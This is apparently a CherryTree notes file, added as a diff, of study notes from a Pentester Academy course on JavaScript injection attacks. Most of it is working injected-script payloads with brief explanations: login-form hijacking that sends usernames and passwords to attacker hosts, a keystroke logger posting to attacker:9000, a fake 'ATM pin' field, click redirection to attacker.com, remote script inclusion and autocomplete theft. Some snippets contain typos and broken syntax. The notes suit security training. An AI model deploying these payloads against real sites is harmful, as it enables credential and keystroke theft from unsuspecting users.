@@ -1,0 +1,265 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Javascript" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1635626717" ts_lastsave="1635631853">
+    <node name="Basics" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1635631853" ts_lastsave="1635634739">
+      <rich_text>
+
+
+
+
+
+Developer Tools: Reading obfuscated/simplified variables and content
+
+• Place a breakpoint at the line number
+• On console -&gt; window.postMessage('anything', ‘*’)
+• Watch more info spawn at the variables and content</rich_text>
+    </node>
+    <node name="Pentester Academy" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1635631839" ts_lastsave="1635776660">
+      <rich_text scale="h3">Modifying HTML Structure</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text family="monospace">&lt;h2 class="form-signin-heading"&gt;Modify me!&lt;/h2&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">&lt;script&gt;
+document.getElementsByTagName("h2")[2].innerHTML = “Modified You!”; 				[2] meaning the third h2 tag, as it starts on 0
+&lt;/script&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text family="monospace">&lt;h1 align="center"&gt;Find me!&lt;/h1&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">document.getElementsByTagName("h1")[0].innerHTML = “Found you!”;</rich_text>
+      <rich_text>
+
+
+</rich_text>
+      <rich_text scale="h3">Change Links on HTML Structure</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">&lt;script&gt;
+var links = document.getElementsByTagName("a");	
+for (i=0; i &lt; links.length; i++)
+{
+	links[i].href = “http://malicious.com”
+	links[i].innerHTML = “Modified Link”
+}
+&lt;/script&gt;</rich_text>
+      <rich_text>
+
+1. get all a=href tags
+2. while i is smaller than the link length it'll replace the link for malicious.com and the hyperlink for Modified Link
+
+
+</rich_text>
+      <rich_text scale="h3">Hijack Submit Form</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text family="monospace">&lt;form class="form-signin"&gt;
+&lt;h2 class="form-signin-heading"&gt;Sign in&lt;/h2&gt;
+&lt;input type="text" value="" class="input-block-level" placeholder="Email" name="email"&gt;
+&lt;input type="password" class="input-block-level" placeholder="Password" name="password"&gt;
+&lt;label class="checkbox"&gt;
+	&lt;input type="checkbox" value="remember-me" name="remme"&gt;Remember Me&lt;/label&gt;
+&lt;/label&gt;
+&lt;button class="btn btn-large btn-primary" type="submit"&gt;Sign in&lt;/button&gt;
+&lt;/form&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">&lt;script&gt;
+function interceptForm() {
+	var username = document.forms[0].elements[0].value;
+	var password = document.forms[0].elements[1].value;
+	new Image().src = “http://local:8000/?username="+username+”&amp;password="+password;
+}
+document.forms[0].onsubmit = interceptForm;
+&lt;/script&gt;</rich_text>
+      <rich_text>
+
+1. define the username and password variables with the values of the form elements (0 for username, 1 for password from the sequence of the form)
+2. then send it to an attack machine on port 8000
+3. then with onsubmit it'll call the function
+
+
+</rich_text>
+      <rich_text scale="h3">Modify Form Fields</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text family="monospace">&lt;form class="form-signin"&gt;
+&lt;h2 class="form-signin-heading"&gt;Sign in&lt;/h2&gt;
+&lt;input type="text" value="" class="input-block-level" placeholder="Email" name="email"&gt;
+&lt;input type="password" class="input-block-level" placeholder="Password" name="password"&gt;
+&lt;label class="checkbox"&gt;
+	&lt;input type="checkbox" value="remember-me" name="remme"&gt;Remember Me&lt;/label&gt;
+&lt;/label&gt;
+&lt;button class="btn btn-large btn-primary" type="submit"&gt;Sign in&lt;/button&gt;
+&lt;/form&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">&lt;script&gt;
+var input = document.createElement("input");
+input.setAttribute("type", “text”);
+input.setAttribute("class", "input-block-level");
+input.setAttribute("placeholder", "ATM pin");
+input.setAttribute("name", "atmpin");
+
+var previous = document.forms[0].elements[0];
+document.forms[0].insertBefore(input, previous);
+document.forms[0].action - “http://local:8000/”
+&lt;/script&gt;</rich_text>
+      <rich_text>
+
+1. define a new box to the form, which is ATM Pin
+2. set all attributes to it
+3. locate the first input in the page in order to position the ATM Pin before it
+4. then just insert and define the action which is to send the info to localhost:8000
+
+
+</rich_text>
+      <rich_text scale="h3">Replace a content</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">var input = document.createElement("h2");
+input.innerHTML = “Website is down, please visit </rich_text>
+      <rich_text style="italic" link="webs http://attacker.com”">http://attacker.com”</rich_text>
+      <rich_text style="italic">;
+document.forms[0].parentNode.appendChild(input);
+
+document.forms[0].removeChild(document.forms[0]);</rich_text>
+      <rich_text>
+
+1.  Create a false warning to redirect the victim to a malicious website
+2. Remove the original content from the page
+
+
+</rich_text>
+      <rich_text scale="h3">Capture all clicks</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">&lt;script&gt;
+function getClick() {
+	location.href = “http://attacker.com”
+}
+document.body.addEventListener('click', getClick, true);
+&lt;/script&gt;</rich_text>
+      <rich_text>
+
+1. Define the function to redirect to attacker.com
+2. use addEventListener to listen for click events and trigger the function
+
+
+</rich_text>
+      <rich_text scale="h3">Keystroke Logging</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">&lt;script&gt;
+document.onkeypress = function keyLogger(inp) {
+	key_pressed = String.fromCharCode(inp.which);
+	new Image().src = “http://attacker:9000/?”+key_pressed;
+}
+&lt;/script&gt;</rich_text>
+      <rich_text>
+
+1. define the function to log the keys
+2. convert unicode values to chars
+3. Send everything to attacker machine
+
+
+</rich_text>
+      <rich_text scale="h3">Event Listener</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">document.forms[0].onsubmit = function demo() {
+	var pass = document.forms[0].elements[1].value;
+	alert(pass);
+}</rich_text>
+      <rich_text>
+
+1. define a function to store the value of the password field in a variable when the submit button it clicked
+2. print the variable
+
+
+</rich_text>
+      <rich_text scale="h3">Include external JS files</rich_text>
+      <rich_text>
+
+window.addEventListener("load", function() { alert(document.cookie);});
+&lt;script src="http://attacker.com/file.js"&gt;&lt;/script&gt;
+
+1. host a JS file which will pop the document.cookie alert
+2. append the src with the URL
+
+
+</rich_text>
+      <rich_text scale="h3">Include external JS files with JS</rich_text>
+      <rich_text>
+
+var newtag = document.createElement("script");
+newtag.type = “text/javascript”;
+newtag.src = “http://attacker.com/file.js”;
+document.body.appendChild(newtag);
+
+1. define a variable to create a script tag, which will have the source of the JS file
+2. append the newtag variable content inside the HTML body
+
+
+</rich_text>
+      <rich_text scale="h3">Replace banner</rich_text>
+      <rich_text>
+
+&lt;script&gt;
+document.getElementByTagName("img")[0].src = “http://attacker.com/image.jpg”;
+&lt;/script&gt;
+
+
+</rich_text>
+      <rich_text scale="h3">Stealing from auto-complete</rich_text>
+      <rich_text>
+
+&lt;script&gt;
+window.setTimeout( function() {
+document.forms[0].action = ‘http://attacker:9000’;
+document.forms[0].submit();
+} , 10000 );
+&lt;/script&gt;
+
+1. set the script to trigger after 10 seconds with the setTimeout function
+2. define another function inside there, which will autosubmit the form and redirect to the attacker address
+
+
+</rich_text>
+      <rich_text scale="h3">Posting with XMLHttpRequest</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">&lt;script&gt;
+username = document.forms[0].elements[0].value;
+password = document.forms[0]elements[1].value;
+window.setTimeout( function() { 
+var req = new XMLHttpRequest();
+req.open("GET", “http://localhost:8000/?username="+username"&amp;password="+password, true);
+req.send();
+} , 10000 );
+&lt;/script&gt;</rich_text>
+      <rich_text>
+
+1. define variables with the content of the form fields
+2. set the timeout for 10 seconds
+3. send a request for the attacker with the user and pass</rich_text>
+    </node>
+  </node>
+</cherrytree>
